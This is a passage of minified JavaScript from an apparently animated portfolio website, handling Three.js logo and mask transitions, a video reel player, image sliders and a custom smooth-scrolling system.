cale.z=1.2*this.transform.about.head.scale.z},onResizeAfter:function(){this.__Flag_ok__&&("about"===__PAGE_TYPE__||"contact"===__PAGE_TYPE__||"404"===__PAGE_TYPE__?(this.origin.head.pos.x=this.transform.about.head.pos.x*__WW__,this.origin.head.pos.y=this.transform.about.head.pos.y*__WH__,this.origin.head.scale.x=this.transform.about.head.scale.x,this.origin.head.scale.y=this.transform.about.head.scale.y):(this.origin.head.pos.x=this.transform.normal.head.pos.x*__WW__,this.origin.head.pos.y=this.transform.normal.head.pos.y*__WH__,this.origin.head.scale.x=this.transform.normal.head.scale.x,this.origin.head.scale.y=this.transform.normal.head.scale.y))},tweens:[],onResetTweens:function(){if(this.tweens.length)for(var t=this.tweens.length-1;t>=0;t--)this.tweens[t]&&this.tweens[t].kill()},setTransForm:function(t){this.onResetTweens(),this.origin.pow=t.pow,this.origin.opacity=t.opacity,this.origin.head.pos.x=t.head.pos.x*__WW__,this.origin.head.pos.y=t.head.pos.y*__WH__,this.origin.rotation.x=t.rotation.x,this.origin.rotation.y=t.rotation.y,this.origin.head.scale.x=t.head.scale.x,this.origin.head.scale.y=t.head.scale.y,this.origin.head.scale.z=t.head.scale.z,this.origin.head.rgb=t.head.rgb},onTransForm:function(t,e,i){this.onResetTweens(),this.origin.opacity=i.opacity;var n=TweenLite.to(this.origin,t,{pow:i.pow,ease:e});this.tweens.push(n),n=TweenLite.to(this.origin.head.pos,t,{x:i.head.pos.x*__WW__,y:i.head.pos.y*__WH__,ease:e}),this.tweens.push(n),n=TweenLite.to(this.origin.rotation,t,{x:i.rotation.x,y:i.rotation.y,ease:e}),this.tweens.push(n),n=TweenLite.to(this.origin.head.scale,t,{x:i.head.scale.x,y:i.head.scale.y,z:i.head.scale.z,ease:e}),this.tweens.push(n),n=TweenLite.to(this.origin.head,t,{rgb:i.head.rgb,ease:e}),this.tweens.push(n)},onMouseMove:function(t,e){if(!loading.__Flag_ing__&&"about"!=__PAGE_TYPE__&&"contact"!=__PAGE_TYPE__&&"404"!=__PAGE_TYPE__){var i=e.getBoundingClientRect(),n=t.clientX,r=t.clientY,a=2*((n-i.left)/i.width-.5),o=2*((r-i.top)/i.height-.5);TweenLite.to(this.anim.mouse,this.anim.mouse.s,{ax:a,ay:o})}},onMouseEnter:function(){loading.__Flag_ing__||"about"==__PAGE_TYPE__||"contact"==__PAGE_TYPE__||"404"==__PAGE_TYPE__||(TweenLite.to(this.anim,this.anim.rotation.in.s,{power:-1,ease:this.anim.rotation.in.e}),this.onTransForm(.6,Power2.easeOut,this.transform.hover),this.doTwist())},doTwist:function(){var t=180,e=1;mouse.cx<0&&(t=-180,e=-1),this.anim.rotation.y=0;var i=t*(Math.PI/180);TweenLite.to(this.anim.rotation,.8,{y:i,ease:Power2.easeInOut}),this.anim.twistTween&&this.anim.twistTween.kill(),this.anim.twistTween=new TimelineLite,this.anim.twistTween.to(this.anim,.4,{twist:e,ease:Power1.easeIn}),this.anim.twistTween.to(this.anim,.8*.8,{twist:0,ease:Back.easeOut.config(1.1)})},onMouseLeave:function(){loading.__Flag_ing__||"about"==__PAGE_TYPE__||"contact"==__PAGE_TYPE__||"404"==__PAGE_TYPE__||(TweenLite.to(this.anim,this.anim.rotation.out.s,{power:0,ease:this.anim.rotation.out.e}),this.onTransForm(.6,Power2.easeOut,this.transform.normal))},onClick:function(){}}},function(t,e,i){"use strict";i.r(e);var n=i(11),r=i(174),a=i.n(r),o=i(175),s=i.n(o);frontGL.__MASK__={__Flag_ok__:!1,__Flag_ing__:!1,frag:a.a,vert:s.a,bg:{plane:{mesh:null}},once:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.scene=new THREE.Scene,this.aspect=this.width/this.height,this.camera=new THREE.OrthographicCamera(-this.height*this.aspect/2,this.height*this.aspect/2,this.height/2,-this.height/2,0,10),this.camera.position.z=10,this.scene.add(this.camera)},onLoadAssets:function(){},onLoaded:function(){this.geometry=new THREE.PlaneBufferGeometry(1,1,1),this.material=new THREE.ShaderMaterial(Object(n.a)({visible:!0,transparent:!0,side:THREE.DoubleSide,uniforms:{power:{value:1},x:{value:1},y:{value:1},type:{value:1},dir:{value:1},rgb:{value:__COL_M__/255},resolution:{type:"v2",value:new THREE.Vector2},mouse:{type:"v2",value:new THREE.Vector2},radius:{value:2},hole:{value:0}},vertexShader:this.vert,fragmentShader:this.frag},"side",THREE.DoubleSide)),this.bg.plane.mesh=new THREE.Mesh(this.geometry,this.material),this.bg.plane.mesh.scale.x=this.width,this.bg.plane.mesh.scale.y=this.height,this.bg.plane.mesh.position.z=0,this.scene.add(this.bg.plane.mesh),this.material.uniforms.mouse.value.x=mouse.sx,this.material.uniforms.mouse.value.y=mouse.sy,this.material.uniforms.resolution.value.x=this.width,this.material.uniforms.resolution.value.y=this.height,this.onResize(),this.__Flag_ok__=!0},__Flag__slideIn__:!1,type:0,tweens:[],onResetTweens:function(){if(this.tweens.length)for(var t=this.tweens.length-1;t>=0;t--)this.tweens[t]&&this.tweens[t].kill()},fade_in_mouse:function(t,e){this.__Flag_ing__=!0,this.onResetTweens(),this.__Flag__slideIn__=!0,this.material.uniforms.type.value=2,this.material.uniforms.radius.value=0,this.material.uniforms.power.value=0,this.material.uniforms.hole.value=0,this.type=3;var i=TweenLite.to(this.material.uniforms.radius,t,{value:2});this.tweens.push(i),i=TweenLite.to(this.material.uniforms.power,t,{value:1,ease:e}),this.tweens.push(i)},fade_out_mouse:function(t,e){this.__Flag_ing__=!0,this.onResetTweens(),this.__Flag__slideIn__=!1,this.material.uniforms.type.value=2,this.material.uniforms.radius.value=2,this.material.uniforms.power.value=1,this.type=3;var i=TweenLite.to(this.material.uniforms.radius,t,{value:0});this.tweens.push(i),i=TweenLite.to(this.material.uniforms.power,t,{value:0,ease:e}),this.tweens.push(i)},fade_donut_out_mouse:function(t,e){this.__Flag_ing__=!0,this.onResetTweens(),this.__Flag__slideIn__=!1,this.material.uniforms.type.value=2,this.material.uniforms.radius.value=3,this.material.uniforms.power.value=1,this.material.uniforms.hole.value=0,this.type=3;var i=TweenLite.to(this.material.uniforms.hole,t,{value:3});this.tweens.push(i),i=TweenLite.to(this.material.uniforms.power,t,{value:0,ease:e}),this.tweens.push(i)},bottom_to_center:function(t,e){this.__Flag_ing__=!0;var i=this;this.onResetTweens(),this.type=0,this.__Flag__slideIn__=!0,this.material.uniforms.dir.value=0,this.material.uniforms.type.value=0,this.material.uniforms.x.value=0,this.material.uniforms.y.value=0;var n=TweenLite.to(this.material.uniforms.power,t,{value:1,ease:e,onComplete:function(){i.onCompleteToCenter()}});this.tweens.push(n),n=TweenLite.to(this.material.uniforms.y,t,{value:1,ease:e}),this.tweens.push(n)},left_to_center:function(t,e){this.__Flag_ing__=!0;var i=this;this.onResetTweens(),this.__Flag__slideIn__=!0,this.type=1,this.material.uniforms.dir.value=1,this.material.uniforms.type.value=1,this.material.uniforms.x.value=0,this.material.uniforms.y.value=0;var n=TweenLite.to(this.material.uniforms.power,t,{value:1,ease:e,onComplete:function(){i.onCompleteToCenter()}});this.tweens.push(n),n=TweenLite.to(this.material.uniforms.x,t,{value:1,ease:e}),this.tweens.push(n)},right_to_center:function(t,e){this.__Flag_ing__=!0;var i=this;this.onResetTweens(),this.type=2,this.__Flag__slideIn__=!0,this.material.uniforms.dir.value=0,this.material.uniforms.type.value=1,this.material.uniforms.x.value=0,this.material.uniforms.y.value=0;var n=TweenLite.to(this.material.uniforms.power,t,{value:1,ease:e,onComplete:function(){i.onCompleteToCenter()}});this.tweens.push(n),n=TweenLite.to(this.material.uniforms.x,t,{value:1,ease:e}),this.tweens.push(n)},center_to_top:function(t,e){var i=this;this.__Flag_ing__=!0,this.onResetTweens(),this.__Flag__slideIn__=!1,this.material.uniforms.dir.value=1,this.material.uniforms.type.value=0,this.material.uniforms.x.value=0,this.material.uniforms.y.value=1;var n=TweenLite.to(this.material.uniforms.power,t,{value:0,ease:e});this.tweens.push(n),n=TweenLite.to(this.material.uniforms.y,t,{value:0,ease:e,onComplete:function(){i.onComplete()}}),this.tweens.push(n)},center_to_right:function(t,e){var i=this;this.__Flag_ing__=!0,this.onResetTweens(),this.__Flag__slideIn__=!1,this.material.uniforms.dir.value=0,this.material.uniforms.type.value=1,this.material.uniforms.x.value=1,this.material.uniforms.y.value=0;var n=TweenLite.to(this.material.uniforms.power,t,{value:0,ease:e});this.tweens.push(n),n=TweenLite.to(this.material.uniforms.x,t,{value:0,ease:e,onComplete:function(){i.onComplete()}}),this.tweens.push(n)},center_to_left:function(t,e){var i=this;this.__Flag_ing__=!0,this.onResetTweens(),this.__Flag__slideIn__=!1,this.material.uniforms.dir.value=1,this.material.uniforms.type.value=1,this.material.uniforms.x.value=1,this.material.uniforms.y.value=0;var n=TweenLite.to(this.material.uniforms.power,t,{value:0,ease:e});this.tweens.push(n),n=TweenLite.to(this.material.uniforms.x,t,{value:0,ease:e,onComplete:function(){i.onComplete()}}),this.tweens.push(n)},onComplete:function(){this.__Flag_ing__=!1},onResize:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.camera.left=-this.width/2,this.camera.right=this.width/2,this.camera.top=this.height/2,this.camera.bottom=-this.height/2,this.camera.updateProjectionMatrix(),this.bg.plane.mesh.scale.x=this.width,this.bg.plane.mesh.scale.y=this.height,this.material.uniforms.resolution.value.x=this.width,this.material.uniforms.resolution.value.y=this.height},onUpdate:function(){this.material.uniforms.mouse.value.x=mouse.fx,this.material.uniforms.mouse.value.y=mouse.fy},onCompleteToCenter:function(){}}},function(t,e){window.styleCounter={$arr:[],n:0,max:0,once:function(){},onInit:function(t){this.$max=document.querySelectorAll(".ui-num .max")[0],this.$min=document.querySelectorAll(".ui-num .min")[0],this.max=t,this.$max&&(this.$max.innerText=this.max)},onCount:function(t){this.$min&&(t<=this.max&&t>0?this.$min.innerText=Math.round(t):this.$min.innerText=1)}},window.pageWorks={total:0,anim:{s:1.33*__ANIM__,e:Power2.easeOut,scale:{from:1.5,to:1.2}},onInit:function(){this.$li=document.querySelectorAll(".works-li"),this.total=this.$li.length,this.total&&styleCounter.onInit(this.total)},onMouseEnter:function(t){var e=parseInt(t.target.dataset.index);if(frontGL.__CONTENTS__.__Flag_ok__&&frontGL.__CONTENTS__.planes.length)for(var i=0;i<frontGL.__CONTENTS__.planes.length;i++)if(frontGL.__CONTENTS__.planes[i].index===e){frontGL.__CONTENTS__.planes[i].hover=!0;var n=frontGL.__CONTENTS__.planes[i].mesh;TweenLite.to(n.material.uniforms.scaleX,this.anim.s,{value:this.anim.scale.to,ease:this.anim.e}),TweenLite.to(n.material.uniforms.scaleY,this.anim.s,{value:this.anim.scale.to,ease:this.anim.e})}},onMouseLeave:function(t){if(frontGL.__CONTENTS__.__Flag_ok__&&frontGL.__CONTENTS__.planes.length)for(var e=0;e<frontGL.__CONTENTS__.planes.length;e++)if(frontGL.__CONTENTS__.planes[e].hover){var i=frontGL.__CONTENTS__.planes[e].mesh;TweenLite.to(i.material.uniforms.scaleX,this.anim.s,{value:this.anim.scale.from,ease:this.anim.e}),TweenLite.to(i.material.uniforms.scaleY,this.anim.s,{value:this.anim.scale.from,ease:this.anim.e})}}}},function(t,e){window.document.createEvent("UIEvents").initUIEvent("resize",!0,!1,window,0),window.pageReel={__Flag_fullscreen__:!1,__Flag_ok__:!1,__Flag_muted__:!1,__Flag_seek__:!1,__Flag_ui__:!1,volume:.5,onInit:function(){this.$video=document.getElementById("js--video-target"),this.$progress=document.querySelectorAll(".ui-video-progress-body .bar")[0],$html.classList.add("js--state-reel-paused"),this.$video?(this.$bar=document.querySelectorAll(".ui-audio .b"),this.onReady(.6),this.__Flag_muted__=!0,this.__Flag_ok__=!0,this.__Flag_seek__=!1,this.__Flag_ui__=!1):(this.$video=null,this.$bar=null,this.__Flag_muted__=!0,this.__Flag_ok__=!1,this.__Flag_seek__=!1,this.__Flag_ui__=!1)},onReady:function(t){var e=this;this.$bar.forEach((function(i,n){var r=.05*n;e.tween=new TimelineLite,e.tween.to(i,t,{y:"0%",delay:r,ease:Power2.easeIn}),e.tween.to(i,.6*t,{y:"-100%",ease:Power2.easeOut}),e.tween.set(i,{y:"100%"}),e.tween.to(i,t,{y:100-20*(n+1)+"%",ease:Power2.easeOut})}))},onWaveOff:function(t){this.$bar.forEach((function(e,i){TweenLite.to(e,t,{y:"80%",ease:Power2.easeOut})}))},onWaveOn:function(t){this.$bar.forEach((function(e,i){TweenLite.to(e,t,{y:100-20*(i+1)+"%",ease:Power2.easeOut})}))},onToggleAudio:function(){this.$video.muted||0===this.$video.volume?(this.audioOn(),this.onWaveOn(.6)):(this.audioOff(),this.onWaveOff(.6))},audioOff:function(){var t=this;$html.classList.remove("js--state-sound-on"),TweenLite.to(this.$video,.6,{volume:0,onComplete:function(){t.$video.muted=!0}})},audioOn:function(){$html.classList.add("js--state-sound-on"),this.$video.muted=!1,this.$video.volume=0,TweenLite.to(this.$video,.6,{volume:this.volume})},onTogglePlay:function(){this.$video&&(this.$video.paused?($html.classList.remove("js--state-reel-paused"),this.$video.play()):($html.classList.add("js--state-reel-paused"),this.$video.pause(),this.__Flag_ui__=!0))},onUpdate:function(){if(this.$video){var t=this.$video.paused,e=this.$video.duration,i=this.$video.currentTime/e;t?($html.classList.remove("js--state-reel-playing"),TweenLite.to(frontGL.__LOGO__.origin.head.pos,1,{y:frontGL.__LOGO__.transform.normal.head.pos.y*__WH__})):($html.classList.add("js--state-reel-playing"),mouse.paused?TweenLite.to(frontGL.__LOGO__.origin.head.pos,1,{y:.55*__WH__}):TweenLite.to(frontGL.__LOGO__.origin.head.pos,1,{y:frontGL.__LOGO__.transform.normal.head.pos.y*__WH__})),i&&(this.$progress.style.transform="scale("+i+",1)")}},onPlaying:function(){},onSeekStart:function(t){this.__Flag_seek__=!0,$html.classList.add("js--state-reel-paused","js--state-reel-seeking"),this.$video.pause();var e=t.clientX,i=(t.clientY,e/__WW__);if(this.$video){var n=this.$video.duration*i;this.$video.currentTime=n}},onSeekTo:function(){var t=mouse.x,e=(mouse.y,t/__WW__);if(this.$video){var i=this.$video.duration*e;this.$video.currentTime=i}},onSeekEnd:function(){this.__Flag_seek__=!1,$html.classList.remove("js--state-reel-paused","js--state-reel-seeking"),this.$video.play();var t=mouse.x,e=(mouse.y,t/__WW__);if(this.$video){var i=this.$video.duration*e;this.$video.currentTime=i}},timer:null,toggleFullscreen:function(){this.$video&&(isFullscreen()?document.exitFullscreen?document.exitFullscreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.webkitExitFullscreen?document.webkitExitFullscreen():document.msExitFullscreen&&document.msExitFullscreen():this.$video.requestFullscreen?this.$video.requestFullscreen():elem.mozRequestFullScreen?this.$video.mozRequestFullScreen():elem.webkitRequestFullscreen?this.$video.webkitRequestFullscreen():elem.msRequestFullscreen&&this.$video.msRequestFullscreen(),resizeControl.onResize())}},window.isFullscreen=function(){return 1>=outerHeight-innerHeight}},function(t,e,i){"use strict";i.r(e),i(25),window.pageSingle={total_height:1e3,onInit:function(){"single"!==__PAGE_TYPE__||isMobileFixed.any||(__IS_PICKUP__?this.isSinglePickUp():this.isSingleNotPickUp()),"home"!=__PAGE_TYPE__&&(fakeScroll.setHeight(this.total_height,1),frontGL.__CONTENTS__.onLoadContents())},isSinglePickUp:function(){for(var t=0,e=__POSTS__.length-1;e>=0;e--)__POSTS__[e].post_id===__POST_ID__&&(t=__POSTS__[e].index);var i=Expo.easeInOut;backGL.__HOME__.onZoomIn(t,1.6,i)},isSingleNotPickUp:function(){backGL.__SINGLE__.onLoadSingleFv()}},window.frontGLSlider={__Flag_ok__:!1,total_width:0,content_width:0,content_padding:0,index:0,ing:!1,slides:[],onInit:function(){var t=this;this.$wraps=document.querySelectorAll('.section-layout[data-layout="slide"]'),this.$wraps.length?(this.__Flag_ok__=!0,this.$wraps.forEach((function(e,i){var n=e.dataset.index,r=e.querySelectorAll(".img-slide-ul"),a=e.querySelectorAll(".img-slide-body"),o=a[a.length-1];t.slides.push({index:n,el:e,slideMoveElem:r,slideElem:a,lastElem:o,total_width:0,x:0,sx:0,ex:0,lx:0})})),this.onResize()):this.__Flag_ok__=!1},lx:0,sx:0,x:0,ex:0,onResize:function(){this.content_width=__WW__-.4*__WH__,this.content_padding=(__WW__-this.content_width)/2,this.slide_padding=.05*__WW__;for(var t=0;t<this.slides.length;t++){this.total_width=0;for(var e=0;e<this.slides[t].slideElem.length;e++){var i=this.slides[t].slideElem[e].getBoundingClientRect().width;this.total_width+=i+this.slide_padding}this.slides[t].total_width=this.total_width-this.slide_padding}},onDragStart:function(t){var e=getParents(t.target,"section-layout");if(e){this.ing=!0,this.index=e.dataset.index;for(var i=0;i<this.slides.length;i++)this.slides[i].index===this.index&&(this.slides[i].sx=t.clientX);$html.classList.add("js-dragging")}},onDragging:function(t){for(var e=0;e<this.slides.length;e++)this.slides[e].index===this.index&&(this.slides[e].x=this.slides[e].ex+1.1*(t.x-this.slides[e].sx),this.slides[e].lx=this.slides[e].x+this.slides[e].total_width-this.content_width,this.slides[e].x>0?this.slides[e].x=0:this.slides[e].lx<0&&(this.slides[e].x=-this.slides[e].total_width+this.content_width),TweenLite.to(this.slides[e].slideMoveElem,1.2,{x:this.slides[e].x,ease:Power3.easeOut}))},onDragEnd:function(){this.ing=!1;for(var t=0;t<this.slides.length;t++)this.slides[t].index===this.index&&(this.slides[t].ex=this.slides[t].x);$html.classList.remove("js-dragging")}},window.frontGLStack={__Flag_ok__:!1,width:0,onInit:function(){this.$dot=document.querySelectorAll(".dot-wrap"),this.$body=document.querySelectorAll(".img-stack-body"),this.$body.length?(this.__Flag_ok__=!0,this.onResize()):this.__Flag_ok__=!1},onResize:function(){var t=this.$body[0].getBoundingClientRect();this.rx=t.left,this.rw=t.width},onMouseEnter:function(t){if(isMobileFixed.any)return!1;this.index=parseInt(t.target.dataset.index);for(var e=0;e<this.$dot.length;e++)this.$dot[e].classList.remove("active");if(frontGL.__CONTENTS__.__Flag_ok__&&frontGL.__CONTENTS__.stacks.mesh.length)for(e=0;e<frontGL.__CONTENTS__.stacks.mesh.length;e++){var i=frontGL.__CONTENTS__.stacks.mesh[e];e===this.index?(TweenLite.to(i.material.uniforms.opacity,.3,{value:1}),this.$dot[e].classList.add("active")):TweenLite.to(i.material.uniforms.opacity,.3,{value:0})}},onMouseLeave:function(){if(isMobileFixed.any)return!1;if(frontGL.__CONTENTS__.__Flag_ok__&&frontGL.__CONTENTS__.stacks.mesh.length)for(var t=0;t<frontGL.__CONTENTS__.stacks.mesh.length;t++){var e=frontGL.__CONTENTS__.stacks.mesh[t];TweenLite.to(e.material.uniforms.opacity,.6,{value:1})}},onClick:function(t){if(!isMobileFixed.any)return!1;var e=t.target.dataset.index;if(e){for(var i=getParents(t.target,"img-stack-wrap"),n=i.querySelectorAll(".dot-wrap"),r=0;r<n.length;r++)r===Number(e)?n[r].classList.add("active"):n[r].classList.remove("active");var a=i.querySelectorAll(".img-stack-li");for(r=0;r<a.length;r++)r===Number(e)?a[r].classList.add("active"):a[r].classList.remove("active")}}},window.getParents=function(t,e){var i=[];i.prevObject=t,function t(e){e.parentNode&&(i.push(e.parentNode),t(e.parentNode))}(t);for(var n=0;n<i.length;n++)if(null!=i[n].classList&&i[n].classList.contains(e))return i[n];return!1}},function(t,e,i){"use strict";i.r(e),i(25),i(266),window.fakeScroll={total_height:0,total_width:0,scroll_ratio:1,__Flag_ok__:!1,__Flag_dom__:!1,timer:{start:{t:null,s:5},ing:{t:null,s:50},end:{t:null,s:100}},body:{y:0,py:0,sy:0,ty:0,ease:.5},speed:{tween:[],pow1:0,pow2:0,pow3:0,dist:0,arr:[]},rect:null,ing:!1,once:function(){},onInit:function(){this.$height=document.querySelectorAll(".js--scroll-height")},setHeight:function(t,e){var i=e;pageBodyScroll.__Flag_ok__&&"home"!=__PAGE_TYPE__?__WIN__?(this.total_height=pageBodyScroll.total_height,this.body.ease=.18):(this.total_height=pageBodyScroll.total_height,this.body.ease=.2):__WIN__?(this.total_height=t*i*1.2,this.body.ease=.3):(this.total_height=t*i,this.body.ease=.3),this.scroll_ratio=i,this.$height=document.querySelectorAll(".js--scroll-height");for(var n=0;n<this.$height.length;n++)this.$height[n].style.height=this.total_height+"px"},onScroll:function(){if(this.anim.ing)return!1;backGL.__HOME__.__Flag_ok__&&"home"===__PAGE_TYPE__&&backGL.__HOME__.onScroll(),clearTimeout(this.timer.start.t),clearTimeout(this.timer.end.t),!touch.ing&&backGL.__HOME__.__Flag_ok__&&"home"===__PAGE_TYPE__&&loading.__Flag_complete__&&!isMobileFixed.any&&(this.timer.start.t=setTimeout((function(){backGL.__HOME__.onScrollStart()}),this.timer.start.s),this.timer.end.t=setTimeout((function(){backGL.__HOME__.onScrollComplete()}),this.timer.end.s)),this.ing=!0,"home"!==__PAGE_TYPE__||isMobileFixed.any||!loading.__Flag_complete__||styleProgress.__Flag_leaving__||styleProgress.onRotate(this.body.py)},onUpdateForDesktop:function(){if(__WTP__=Math.round(__WT__/(this.total_height-__WH__)*1e4)/1e4,!loading.__Flag_ing__)switch(__PAGE_TYPE__){case"home":break;case"works":styleProgress.onProgress(this.body.py),styleProgress.__Flag_count__=!1;break;default:this.body.y<this.total_height-1.5*__WH__?(styleProgress.onProgress(this.body.py),styleProgress.__Flag_count__=!1):styleProgress.__Flag_count__||styleProgress.onCountStart()}if(this.body.y+=(__WT__-this.body.y)*this.body.ease,.001>=this.body.y&&(this.body.y=0),this.body.py=this.body.y/(this.total_height-__WH__),this.speed.arr.length>1?(this.speed.arr.shift(),this.speed.arr.push(this.body.y)):this.speed.arr.push(this.body.y),this.ing&&2===this.speed.arr.length&&timestep%3){this.speed.dist=Math.abs(this.speed.arr[1]-this.speed.arr[0]);var t=.001*this.speed.dist*-mouse.dir;t>.2&&(t=.2);var e=TweenLite.to(this.speed,.2,{pow2:t});this.speed.tween.push(e)}},onUpdateForMobile:function(){if(__WTP__=Math.round(__WT__/(this.total_height-__WH__)*1e4)/1e4,!loading.__Flag_ing__)switch(__PAGE_TYPE__){case"home":loading.__Flag_splash_complete__&&styleProgress.onProgress(this.body.py);break;case"works":styleProgress.onProgress(this.body.py),styleProgress.__Flag_count__=!1;break;default:this.body.y<this.total_height-1.01*__WH__?(styleProgress.onProgress(this.body.py),styleProgress.__Flag_count__=!1):styleProgress.__Flag_count__||styleProgress.onCountStart()}this.body.y=__WT__,this.body.py=this.body.y/(this.total_height-__WH__)},onResetTweens:function(){for(var t=0;t<this.speed.tween.length;t++)this.speed.tween[t]&&this.speed.tween[t].kill()},anim:{ing:!1,tween:null,y:0,timer:null},onSplashIn:function(t,e,i,n){var r=this;this.anim.tween&&this.anim.tween.kill(),this.anim.ing=!0,isMobileFixed.any?this.anim.tween=TweenLite.from(".site-body",t,{scrollTo:n,ease:e,delay:i,onComplete:function(){r.anim.ing=!1,loading.__Flag_splash_complete__=!0}}):(__WT__=n,this.body.y=n,this.body.py=n/(this.total_height-__WH__),this.anim.y=n,window.scroll(0,n),this.anim.tween=TweenLite.to(this.anim,t,{y:5,ease:e,delay:i,onUpdate:function(){window.scroll(0,this.target.y)},onComplete:function(){r.anim.ing=!1,loading.__Flag_splash_complete__=!0}}),clearTimeout(this.anim.timer),this.anim.timer=setTimeout((function(){r.anim.ing=!1}),1e3*t))},onScrollFrom:function(t,e,i,n){var r=this;this.anim.ing=!0,clearTimeout(this.anim.timer),this.anim.tween&&this.anim.tween.kill(),backGL.__HOME__.onScrollReset(),__WT__=n,this.body.y=n,this.body.py=n/(this.total_height-__WH__),this.anim.y=n,window.scroll(0,n),this.anim.tween=TweenLite.to(this.anim,t,{y:5,ease:e,delay:i,onUpdate:function(){backGL.__HOME__.onScroll(),window.scroll(0,this.target.y)},onComplete:function(){r.anim.ing=!1}}),this.anim.timer=setTimeout((function(){r.anim.ing=!1}),1e3*t)},onScrollTo:function(t,e,i){var n=this;this.anim.ing=!0,clearTimeout(this.anim.timer),this.anim.tween&&this.anim.tween.kill(),__WT__=0,this.body.y=0,this.body.py=0,this.anim.y=0,window.scroll(0,0),this.anim.tween=TweenLite.to(this.anim,t,{y:i,ease:e,onUpdate:function(){window.scroll(0,this.target.y)},onComplete:function(){n.anim.ing=!1}}),this.anim.timer=setTimeout((function(){n.anim.ing=!1}),1e3*t)}},window.pageBodyScroll={__Flag_ok__:!1,sections:[],statics:[],total_height:0,$body:null,rect:null,$scroll:null,targets:[],header:{height:0,y1:0,y2:0,pow:0,hitory:[],dir:"down"},once:function(){this.$toggle=document.querySelectorAll(".ui-toggle")[0],this.$logo=document.querySelectorAll(".logo-wrap")[0];var t=this.$toggle.getBoundingClientRect();this.header.height=t.height},onAnchorScroll:function(){isMobileFixed.any?TweenLite.to(".site-body",1.2,{scrollTo:__WH__,ease:Power3.easeOut}):TweenLite.to(window,1.2,{scrollTo:__WH__,ease:Power3.easeOut})},anchor:null,onAnchorEnter:function(){this.anchor&&(this.anchor.kill(),this.anchor=null),this.anchor=new TimelineLite,this.anchor.to(".site-control-arrow-body",.4,{y:"100%",ease:Power2.easeIn}),this.anchor.set(".site-control-arrow-body",{y:"-100%"}),this.anchor.to(".site-control-arrow-body",.6,{y:"0%",ease:Power2.easeOut})},onInit:function(){if(this.$header=document.querySelectorAll(".page-header"),this.$body=document.querySelectorAll(".page-inner"),this.$scroll=document.querySelectorAll(".js--scroll"),document.querySelectorAll(".section-layout").length&&document.querySelectorAll(".section-layout").forEach((function(t,e){t.dataset.layout;var i=getPrevElement(t),n=getNextElement(t);if(i){var r=i.dataset.layout;t.setAttribute("data-prev",r),"fullscreen"!=r&&t.classList.add("is-not-prev-fullscreen")}if(n){var a=n.dataset.layout;t.setAttribute("data-next",a),"fullscreen"!=a&&t.classList.add("is-not-next-fullscreen")}})),this.total_height=0,this.$body.length){if(this.rect=this.$body[0].getBoundingClientRect(),this.total_height=this.rect.height,this.__Flag_ok__=!0,this.statics=[],this.sections=[],isMobileFixed.any){for(var t=0;t<this.$scroll.length;t++){var e=this.$scroll[t];"img"===e.dataset.type?e.classList.add("js--bg-img-inview"):"video"===e.dataset.type&&("reel"!=__PAGE_TYPE__&&(getParents(e,"section").classList.add("section-bg-video"),e.classList.add("js--bg-video","js--ratio-by-w")),e.querySelectorAll(".bg-img").length&&e.classList.add("js--bg-img-inview")),this.statics.push({el:e,type:e.dataset.type})}styleRatio.onResize()}for(t=0;t<this.$scroll.length;t++){var i=this.$scroll[t],n=i.getBoundingClientRect(),r=n.left,a=n.top,o=n.height,s=n.width,l=null;i.classList.contains("plane")&&(l={src2x:i.dataset.src2x,src1x:i.dataset.src1x,type:i.dataset.type,layout:i.dataset.layout,uid:i.dataset.uid,w:parseInt(i.dataset.w),h:parseInt(i.dataset.h)});var c=!1;i.dataset.pow&&(c=Number(i.dataset.pow));var h=!1;i.dataset.bg&&(h=!0),isMobileFixed.any||this.sections.push({el:i,y:0,rx:r,ry:a,rh:o,rw:s,rect:n,tween:null,visible:!1,over:!1,pow:c,bg:h,status:l}),i.dataset.index=t}}else this.__Flag_ok__=!1;this.onResize()},onResize:function(){var t=this.$toggle.getBoundingClientRect();if(this.header.height=t.height,this.sections.length&&isMobileFixed.desktop)for(var e=0;e<this.sections.length;e++)this.sections[e].y=0,this.sections[e].el.style.transform="translate3d(0, 0, 0)",t=this.sections[e].el.getBoundingClientRect(),this.sections[e].rx=t.left,this.sections[e].ry=t.top,this.sections[e].rh=t.height,this.sections[e].rw=t.width,this.sections[e].y=__WT__,this.sections[e].el.style.transform="translate3d(0, "+__WT__+"px, 0)";this.rect=this.$body[0].getBoundingClientRect(),this.total_height=this.rect.height,fakeScroll.setHeight(this.total_height,1)},isBgWhite:0,onUpdate:function(){for(var t=0;t<this.sections.length;t++){var e=this.sections[t],i=fakeScroll.body.y;if(e.pow&&(i=fakeScroll.body.y*e.pow),__LEGACY__){if(isMobileFixed.desktop){var n=.1*__WH__,r=e.ry-n<fakeScroll.body.y+__WH__,a=e.ry+e.rh+n+-fakeScroll.body.y>0;r&&a?(e.el.style.transform="translate3d(0px, "+-i+"px, 0)",e.visible=1):e.visible=0}}else if(e.visible=parseInt(e.el.dataset.visible),isMobileFixed.desktop){var o=e.ry<fakeScroll.body.y+__WH__,s=e.ry+e.rh+-fakeScroll.body.y>0;(o&&s||e.visible)&&(e.el.style.transform="translate3d(0px, "+-i+"px, 0)")}e.over=!1,e.ry<fakeScroll.body.y+__WH__&&e.status&&(e.over=!0)}if("works"===__PAGE_TYPE__){var l=0;for(t=0;t<this.sections.length;t++)this.sections[t].over&&l++;styleCounter.onCount(l)}}}},,function(t,e,i){"use strict";i.r(e),i(4),window.timestep=0,window.fps={t:0,frame:0,start:0,end:0,step:8,onLoop:function(){}},window.renderForDesktop=function(){if(timestep<1e4?timestep++:timestep=0,__LOWSPEC__)return!1;if(requestAnimationFrame(renderForDesktop),!styleMenu.__Flag_open_before__||routeTransition.__Flag__start){switch(__PAGE_TYPE__){case"home":routeTransition.__Flag__Back||frontGL.__HOME__.onUpdate();break;default:frontGL.__CONTENTS__.onUpdate()}frontGL.__LOGO__.onUpdate()}switch(__PAGE_TYPE__){case"home":frontGL.renderer.render(frontGL.__HOME__.scene,frontGL.__HOME__.camera);break;default:frontGL.renderer.render(frontGL.__CONTENTS__.scene,frontGL.__CONTENTS__.camera)}if(frontGL.renderer.render(frontGL.__LOGO__.scene,frontGL.__LOGO__.camera),frontGL.__MASK__.__Flag_ing__&&(frontGL.__MASK__.onUpdate(),frontGL.renderer.render(frontGL.__MASK__.scene,frontGL.__MASK__.camera)),styleMenu.__Flag_open_before__||!routeTransition.render||"menu"===routeTransition.type)return!1;if(routeTransition.__Flag__Back||(fakeScroll.onUpdateForDesktop(),pageBodyScrol